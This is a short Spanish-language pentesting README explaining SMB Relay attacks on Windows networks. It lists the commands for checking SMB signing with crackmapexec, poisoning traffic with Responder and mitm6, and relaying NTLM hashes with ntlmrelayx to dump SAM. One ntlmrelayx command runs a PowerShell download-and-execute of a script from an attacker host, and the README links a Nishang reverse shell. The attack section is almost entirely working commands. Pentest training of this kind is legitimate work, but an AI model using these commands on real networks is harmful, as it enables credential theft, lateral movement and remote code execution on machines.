# Qué es un SMB Relay?

- En vez de crackear hashes obtenidos con el Repsonder, podemos pasar esos hashes a alguna máquina específica para ganar acceso.
- Es necesario que el SMB no esté firmado para que no se de validado la legitimdad del origen.
- Las credenciales que se le pasen a un equipo deben ser de un Administrador del mismo.

# Explicación gráfica del vector de ataque

[Ver la imagen](Images/main/README.md)

# Como ver si el smb está fimado

```
crackmapexec smb <target>
```

[Ver Ejemplo](Images/firma/README.md)


# Comprobar si tus credenciales son privilegiadas sobre un equipo

```
crackmapexec smb <target> -u 'USUARIO' -p 'CONTRASEÑA'
```
[Ver Ejemplo](Images/creds/README.md)


# Configurar Responder para SMB Relay
HTTP y SMB deben estar en Off en la configuración del Responder

```
sudo nano /usr/share/responder/Responder.conf
```
<img src="https://i.imgur.com/XypgqGB.png" />

# Efectuar un SMB Relay por IPv4
El Responder debe estar activo envenenando el tráfico de la red,
```
python /usr/share/responder.py -I tun0 -rdw
```
```
ntlmrelayx.py -tf <targets.txt> -smb2support
```
[Ver Ejemplo de dumpeo de SAM](Images/sam/README.md)

# Ejecutar comandos mediante un SMB Relay por IPv4
```
ntlmrelayx.py -tf <targets.txt> -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.0:8000/PS.ps1')"
```
[Descargar shell de Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

# Ejecutar comandos mediante un SMB Relay por IPv6
Primero envenenamos el dominio con `mitm6` para luego entrar en una sesión interactiva con `ntlmrelayx` y mediante el comando `socks` podremos ver las conexiones y el `AdminStatus` de los usuarios.
```
mitm6 -d <dominio>
```
```
ntlmrelayx.py -6 -wh <ip_atacante> -t smb://<ip_victima> -socks -debug -smb2support
```

